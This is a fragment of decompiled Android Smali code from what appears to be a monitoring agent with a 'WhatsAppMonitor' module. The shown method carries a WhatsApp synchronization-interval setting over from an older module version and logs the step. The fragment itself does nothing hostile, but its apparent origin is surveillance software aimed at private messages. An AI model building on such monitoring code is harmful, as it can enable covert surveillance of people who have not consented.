    invoke-interface {v0, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_4
    if-eqz p1, :cond_5

    const-string v2, "wa_synchronization_interval"

    .line 190
    invoke-interface {v1, v2, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v2, "WhatsAppMonitor"

    .line 195
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "update(): saving va from the previous module: wa_synchronization_interval="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-interface {v0, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 201
    :cond_5
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result p1

    return p1

    :catch_0
    const-string p1, "WhatsAppMonitor"

    const-string v3, "Could not load the persistedModuleData from the old module we are currently upgrading."

    .line 139
    invoke-interface {v0, p1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v1
.end method
